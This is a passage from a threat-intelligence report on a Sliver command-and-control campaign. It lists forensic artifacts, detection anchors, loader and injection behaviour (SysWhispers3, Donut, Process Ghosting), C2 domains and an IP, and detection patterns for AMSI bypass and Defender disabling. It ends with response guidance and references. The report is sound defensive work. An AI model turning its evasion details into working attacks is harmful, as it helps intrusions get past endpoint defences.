| Dropped beacon | `%TEMP%\update.exe` | Primary recovery target — the beacon on disk; may already be deleted |
| PowerShell history | `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` | May retain the stager invocation command; survives session end |
| Prefetch file | `C:\Windows\Prefetch\UPDATE.EXE-XXXXXXXX.pf` | Execution timestamp and run count; persists after beacon deletion; strong evidence of execution |
| Windows Defender event log | EID 5001 in Microsoft-Windows-Windows Defender/Operational | Confirms real-time protection was disabled (requires admin-level execution) |
| MRU entries | `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs` | Possible correlation to delivery document if user-lure delivery was used |

#### Loader Stage (OneDriveSync.exe / update.exe)

**Structural detection anchors that survive polymorphic rebuilds:**

- **Certificate serial `659EEB5AA4A489FB238993AF259D23F057F6D6D6`** — every binary from this build pipeline carries this serial. Binary signed by `VMware, Inc. Code Signing` where issuer = subject (self-signed) is a high-fidelity anomaly; any code-signing cert with `CA:TRUE` is definitively scripted/fraudulent.
- **SysWhispers3 hash seed** `\x94\x8D\xEA\x9D` (little-endian `0x9DEA8D94`) — compiled constant present in any binary using this SysWhispers3 configuration; YARA rule with this four-byte sequence and 600-entry sorted array structure identifies SysWhispers3 across polymorphic builds.
- **Hardcoded PEB spoofing string** `MicrosoftEdgeUpdate.exe --update-check --silent` — present in every build from this pipeline; detectable via process argument monitoring.
- **Path mismatch** — process claiming `MicrosoftEdgeUpdate.exe` identity running from `%TEMP%\update.exe` is a high-confidence indicator; EDR comparison of claimed vs. actual binary path.

**Behavioral API sequence fingerprint (EDR telemetry):** The sandbox-environment-check immediately preceding injection is a high-confidence, low-noise behavioral pattern detectable in EDR API call logs. The specific chain:

```
update.exe → GetSystemInfo()            (processor count check)
update.exe → GetTickCount()             (uptime check)
update.exe → NtOpenProcess()            (cross-process injection begins)
update.exe → NtAllocateVirtualMemory()  (shellcode staging)
update.exe → NtWriteVirtualMemory()     (shellcode write)
update.exe → NtProtectVirtualMemory()   (RX permission set)
update.exe → NtCreateThread()           (execution)
```

`GetSystemInfo → GetTickCount → cross-process NtOpenProcess` in immediate sequence is the behavioral fingerprint of a sandbox-checking injector. Critically: `GetSystemInfo` and `GetTickCount` are standard Win32 API calls that route through ntdll normally — they are **not** routed through the SysWhispers3 layer and remain visible to usermode EDR hooks even when the subsequent injection operations are not. This provides a behavioral detection anchor that survives SysWhispers3 evasion: the sandbox checks are observable even if the injection calls are not.

#### Runtime / Injection Stage

**Process hollowing and injection indicators:**

- **18–19 MB anonymous private memory region** (`PAGE_EXECUTE_READWRITE`, VadS tag) in any process — the Donut staging region size and protection are distinctive. Memory region scanner (malfind plugin) and EDR memory scanning detect this.
- **NOP sled followed by `0x9A` (CALLF)** at allocation base+0x59 — Donut VEH bootstrap entry pattern; confirmed by memory forensics tool hexdump.
- `**STATUS_CONFLICTING_ADDRESSES` (C0000018)** in process LastStatus — injection precursor; observed across multiple debugger sessions.
- **Process Ghosting five-step chain**: `CreateFile` with `DELETE_ON_CLOSE` → `SetFileInformationByHandle(FileDispositionInfo)` → `NtCreateSection(SEC_IMAGE)` → `NtCreateProcessEx` — unusual and specific sequence detectable via kernel-level ETW callbacks.
- **Process with no resolvable on-disk image path** — Process Ghosting artifact; detectable via Process Explorer, EDR, or memory forensics tool.
- **ETW silence anomaly** — `sihost.exe` post-injection producing zero ETW events despite active network behavior is a high-confidence signal. A process that is active but produces no telemetry is itself the detection.

#### C2 Communication Stage

**Network-based detection (C2 domains and server fingerprinting):**

- Block and monitor `mailuxe.net`, `mailmassange.duckdns.org`, and `45.94.31.220` at network egress.
- Monitor `sihost.exe` for any outbound network connections to non-Microsoft addresses — legitimate sihost.exe connections are well-profiled and predominantly inbound/local; any outbound connection to an external IP is anomalous.
- **Certificate serial TLS detection** — monitor for TLS connections where the server certificate carries serial `659EEB5AA4A489FB238993AF259D23F057F6D6D6`. This is the most durable C2 detection anchor.
- Monitor for periodic DNS queries to `*.duckdns.org` from internal hosts at regular intervals.
- **JARM fingerprinting** for the Sliver teamserver — Microsoft MSTIC documented Sliver-specific JARM hashes; the C2 server may be fingerprint-able even if the implant is not.
- Sliver mTLS with randomized certificates presents less-signatured TLS traffic than Cobalt Strike's well-documented profiles, but Go binary runtime characteristics (static compilation, memory allocation patterns, HTTP header combinations) remain detectable hunting targets per Microsoft MSTIC research.
- **Consistent POST request size (proxy/firewall log hunting):** Sliver beacon callbacks exhibit near-identical POST request sizes on each check-in cycle. Proxy and firewall logs showing consistent POST byte sizes (reference traffic from this campaign: ~1842 bytes) from a background process to an external host at irregular but bounded intervals (matching the 90–510 second callback window) are a beaconing fingerprint detectable without TLS inspection. Consistent byte-count POST traffic from a system process (`sihost.exe`) to a non-Microsoft external IP or domain at variable-but-bounded intervals is a viable SIEM hunting rule in environments without SSL inspection capability.

---

## 9. Analytical Caveats and Gaps

### Critical Assumptions

**A1 — mailuxe.net resolves to 45.94.31.220:** If incorrect — if `mailuxe.net` resolves to a separate, more protected C2 server — then blocking `45.94.31.220` alone would not disrupt C2 communications. Verification via passive DNS lookup is the resolution path.

**A2 — Actual C2 IP in Donut instance:** This assessment cannot confirm the C2 IP embedded in the AES-encrypted Donut section without offline decryption. The recovered AES-128-CTR key (`19 72 1F E6 E3 B0 CF 0C 32 0B 93 E0 C2 BE 91 1A`) and nonce (`EA 2A 1C 5A 8D E1 33 7B DA 31 47 65 40 51 D0 89`) enable offline decryption of the memory forensics tool memory dump at VAD region `0x1f7f8e00000`–`0x1f7fa074fff` (PID 3488). **This is the highest-priority analytical gap.**

**A3 — Excel.exe shares the same payload core as OneDriveSync.exe:** Assessed as HIGH confidence (90%) based on identical ~33 MB file size and same build date, hash is the same. A second, uncharacterized C2 channel remains possible if Excel.exe uses a different configuration.

**A4 — Open directory exposure was accidental:** Evidence is strong (unencrypted private key exposed; build log in serving directory; < 7-hour exposure window after build). Probability of deliberate decoy: < 3%. If incorrect, all artifacts should be re-evaluated as potentially misleading.

**A5 — stager.ps1 is the primary delivery mechanism:** If the stager is a test artifact, the primary delivery vector for victim compromise is unknown.

**A6 — Hollow process target is sihost.exe:** build.log explicitly names `C:\Windows\System32\sihost.exe`. Not live-confirmed — ScareCrow config could override the build.log specification.

**A7 — Threat actor is a cybercrime operator:** If a state actor is deliberately using commodity tools as cover (false flag), the threat model should be substantially elevated. Assessed probability: < 5%.

### Analytical Gaps Summary


| Gap                                          | Impact                                                                               | Priority |
| -------------------------------------------- | ------------------------------------------------------------------------------------ | -------- |
| Actual C2 IP in Donut instance not confirmed | Cannot confirm beacon callout destination; blocking 45.94.31.220 may be insufficient | CRITICAL |
| Excel.exe hash not recovered                 | Potential parallel campaign with uncharacterized C2                                  | HIGH     |
| mailuxe.net passive DNS history              | Cannot confirm registration date or resolve H1/H2 hypothesis                         | HIGH     |
| Hollow target not live-confirmed             | Monitoring focused on sihost.exe based on assumption                                 | MEDIUM   |
| Sliver PE not extracted from memory          | Cannot confirm Sliver version or additional config options                           | MEDIUM   |
| AMSI patch bytes not byte-verified           | Cannot confirm AmsiScanBuffer was actually patched                                   | LOW      |
| Canary domain behavior not tested            | Whether beacon aborted in FlareVM environment is uncertain                           | LOW      |
| Build workspace on internal endpoint not assessed | Implicitly a different threat scenario — see note below                         | LOW      |


**Build workspace discovery on internal endpoints:** This report documents the open directory exposure scenario — the build workspace was accessible via a public-facing port. If `build.log`, the UUID-named workspace directory (`/var/tmp/.cache-1f6a38a2-1771081283/`), or the presence of ScareCrow, Donut, or SysWhispers3 binaries is discovered during EDR triage of an **internal endpoint** rather than via external scanning, the implications differ significantly. Discovery on an internal host indicates deep host access, an internal staging environment, or a potential insider threat — not an accidental exposure of a public-facing server. For endpoint forensics triage, the workspace UUID `1f6a38a2-1771081283` is a specific hunt string for EDR process telemetry and filesystem logs. Presence of Go 1.24.2 toolchain installation outside expected developer environments on the same host strengthens the assessment.

---

## 10. Response Guidance

### If This Infrastructure or Toolkit is Observed

**Priority 1 — Immediate Containment**

- Isolate any system that executed `stager.ps1` or made outbound connections to `45.94.31.220`, `mailuxe.net`, or `mailmassange.duckdns.org`
- Block all three C2 destinations at network egress: `45.94.31.220`, `mailuxe.net` (ports 443, 8443), `mailmassange.duckdns.org` (port 443); also block AS210558 prefix space per threat intelligence guidance
- Preserve forensic state before remediation — Memory forensics tool memory capture of affected systems enables Donut instance decryption and Sliver configuration recovery
- Rotate credentials for any accounts that authenticated on potentially affected systems

**Priority 2 — Investigation**

- Deploy the detection signatures from `hunting-detections/sliver-open-directory-detections.md` across endpoint detection platforms
- Hunt for the certificate serial `659EEB5AA4A489FB238993AF259D23F057F6D6D6` in TLS connection logs and signed file records
- Examine `sihost.exe` on potentially affected systems for injected threads not originating from its own image
- Review PowerShell Script Block Logging (EID 4104) for `amsiInitFailed` string and `Set-MpPreference -DisableRealtimeMonitoring` calls
- Check for processes with no resolvable on-disk image path (Process Ghosting artifact)

**Priority 3 — Scope Assessment**

- Determine whether `Excel.exe` was also used as a delivery mechanism — the parallel delivery track is uncharacterized
- Assess whether any endpoints made DNS queries to `mailmassange.duckdns.org` or `mailuxe.net` in the period from 2026-02-14 onward
- Evaluate whether the private signing key (`key.pem`) was downloaded by parties other than analysts — third-party VMware-impersonating binaries with the same certificate serial may emerge

**Priority 4 — Remediation Approach**

Remediation strategy should reflect the injection architecture:

- Systems where Sliver successfully established C2 and an operator took interactive actions: full rebuild is recommended due to unknown scope of operator-deployed persistence mechanisms
- Systems where the stager ran but injection failed (C2 offline): targeted remediation may be viable — remove identified beacon artifacts from temporary directories, validate no persistence keys were written, monitor for resumed activity
- The loader itself installs no persistence (DEFINITE — confirmed by behavioral sandbox and memory forensics tool); persistence scope depends entirely on operator actions taken via C2 after successful beacon establishment

### Proactive Threat Hunting (No Confirmed Infection)

- Deploy YARA rule targeting SysWhispers3 hash seed `\x94\x8D\xEA\x9D` across endpoint memory scanning
- Hunt for TLS connections with certificate serial `659EEB5AA4A489FB238993AF259D23F057F6D6D6`
- Search historical network logs for connections to `45.94.31.220:8000`, `mailuxe.net`, `mailmassange.duckdns.org`
- Monitor for processes claiming `MicrosoftEdgeUpdate.exe` identity running from non-standard paths
- Review PowerShell EID 4104 logs for `amsiInitFailed` and `DownloadFile` from `45.94.31.220`
- Enable kernel-level ETW telemetry providers (such as Microsoft-Windows-Threat-Intelligence) for enhanced visibility into syscall execution origins — this is the most effective counter to SysWhispers3-based evasion

---

## Appendix A: IOC and Detection File References {#appendix-a}

### IOC Feed (Machine-Readable)

**File:** [`sliver-open-directory-iocs.json`]({{ "/ioc-feeds/sliver-open-directory-iocs.json" | relative_url }})
**Created by:** IOC Specialist (Stage 1.5)
**Total indicators:** 33 across categories:

- File hashes: 6 (2 MD5, 2 SHA1, 2 SHA256 — for OneDriveSync.exe and compressed.exe)
- Network indicators: 5 (1 IPv4, 2 domains, 2 URLs)
- Certificate indicators: 1 (serial `659EEB5AA4A489FB238993AF259D23F057F6D6D6`)
- File path indicators: 3
- Memory indicators: 2 (Donut region pattern, AES key/nonce)
- String IOCs: 8
- Behavioral indicators: 8
- TLP: WHITE — suitable for sharing without restrictions
- Note: IOCs include confidence levels and false-positive risk ratings; the certificate serial and behavioral indicators are rated highest for durability across polymorphic rebuilds.

### Detection Rules

**File:** [`sliver-open-directory-detections`]({{ "/hunting-detections/sliver-open-directory-detections/" | relative_url }})
**Created by:** Detection Engineer (Stage 3)
**Coverage:** YARA (file and memory), Sigma (behavioral), Suricata (network), EDR queries (multiple platforms), SIEM queries (Splunk, Elastic)
**Detection strategy note:** Rules are structured to target architectural constants that survive polymorphic regeneration — the SysWhispers3 hash seed, the Donut VEH bootstrap pattern, the XZ config header mode byte structure, and the fraudulent certificate serial — alongside specific-hash rules for the confirmed samples.
**License:** CC BY-NC 4.0

---

## Appendix B: Research References {#appendix-b}

### Tier 1 Sources (Authoritative)

- MITRE ATT&CK T1055.012 (Process Hollowing) — [https://attack.mitre.org/techniques/T1055/012/](https://attack.mitre.org/techniques/T1055/012/)
- MITRE ATT&CK T1134.004 (PPID Spoofing) — [https://attack.mitre.org/techniques/T1134/004/](https://attack.mitre.org/techniques/T1134/004/)
- MITRE ATT&CK T1562.006 (ETW patching) — [https://attack.mitre.org/techniques/T1562/006/](https://attack.mitre.org/techniques/T1562/006/)
- MITRE ATT&CK T1553.002 (Code Signing) — [https://attack.mitre.org/techniques/T1553/002/](https://attack.mitre.org/techniques/T1553/002/)
- GitHub optiv/ScareCrow — [https://github.com/optiv/ScareCrow](https://github.com/optiv/ScareCrow)
- GitHub klezVirus/SysWhispers3 — [https://github.com/klezVirus/SysWhispers3](https://github.com/klezVirus/SysWhispers3)
- GitHub TheWover/donut — [https://github.com/TheWover/donut](https://github.com/TheWover/donut)
- IPinfo.io AS210558 record — [https://ipinfo.io/AS210558](https://ipinfo.io/AS210558)
- PeeringDB AS210558 — [https://www.peeringdb.com/net/34338](https://www.peeringdb.com/net/34338)

### Tier 2 Sources (Reputable)

- Microsoft MSTIC "Looking for the Sliver Lining" (Aug 2022) — [https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/](https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/)
- Proofpoint "TA551 Uses SLIVER Red Team Tool in New Activity" — [https://www.proofpoint.com/us/blog/security-briefs/ta551-uses-sliver-red-team-tool-new-activity](https://www.proofpoint.com/us/blog/security-briefs/ta551-uses-sliver-red-team-tool-new-activity)
- Cybereason "Sliver C2 Leveraged by Many Threat Actors" — [https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors](https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors)
- Synacktiv "KrustyLoader — Rust malware linked to Ivanti ConnectSecure compromises" (Jan 2024) — [https://www.synacktiv.com/en/publications/krustyloader-rust-malware-linked-to-ivanti-connectsecure-compromises](https://www.synacktiv.com/en/publications/krustyloader-rust-malware-linked-to-ivanti-connectsecure-compromises)
- VMRay "Advantage Attacker: EDR Bypass Tools — ScareCrow" — [https://www.vmray.com/advantage-attacker-edr-bypass-tools-scarecrow/](https://www.vmray.com/advantage-attacker-edr-bypass-tools-scarecrow/)
- Elastic Security Labs "Doubling Down: Detecting In-Memory Threats with Kernel ETW Call Stacks" — [https://www.elastic.co/security-labs/doubling-down-etw-callstacks](https://www.elastic.co/security-labs/doubling-down-etw-callstacks)
- Elastic Security Labs "Call Stacks: No More Free Passes For Malware" — [https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- Elastic Security Labs / Gabriel Landau Process Ghosting research (2021)
- IBM X-Force "Reflective call stack detections and evasions" — [https://www.ibm.com/think/x-force/reflective-call-stack-detections-evasions](https://www.ibm.com/think/x-force/reflective-call-stack-detections-evasions)
- ReversingLabs "You are you, but so am I — certificate impersonation" — [https://www.reversinglabs.com/blog/digital-certificatesyou-are-you-but-so-am-i](https://www.reversinglabs.com/blog/digital-certificatesyou-are-you-but-so-am-i)
- Red Canary "Certified evil: Investigating signed malicious binaries" — [https://redcanary.com/blog/threat-detection/code-signing-certificates/](https://redcanary.com/blog/threat-detection/code-signing-certificates/)
- Recorded Future 2024 Malicious Infrastructure Report — [https://www.recordedfuture.com/research/2024-malicious-infrastructure-report](https://www.recordedfuture.com/research/2024-malicious-infrastructure-report)
- Optiv "ScareCrow Payload Creation Framework" — [https://www.optiv.com/insights/source-zero/tools/scarecrow](https://www.optiv.com/insights/source-zero/tools/scarecrow)

### Tier 3 Sources (Community — Corroborated)

- Krebs on Security "Who's Behind the Seized Forums 'Cracked' & 'Nulled'?" (Feb 2025) — [https://krebsonsecurity.com/2025/02/whos-behind-the-seized-forums-cracked-nulled/](https://krebsonsecurity.com/2025/02/whos-behind-the-seized-forums-cracked-nulled/)
- Hunt.io "Pentester or Threat Actor?" — [https://hunt.io/blog/pentester-or-threat-actor-open-directory-exposes-test-results-and-possible-targeting-of-government-organizations](https://hunt.io/blog/pentester-or-threat-actor-open-directory-exposes-test-results-and-possible-targeting-of-government-organizations)
- Hunt.io "Open Directories Expose Publicly Available Tools Targeting Asian Organizations" — [https://hunt.io/blog/open-directories-expose-publicly-available-tools-targeting-asian-organizations](https://hunt.io/blog/open-directories-expose-publicly-available-tools-targeting-asian-organizations)

---

## License

© 2026 Joseph. All rights reserved. See LICENSE for terms.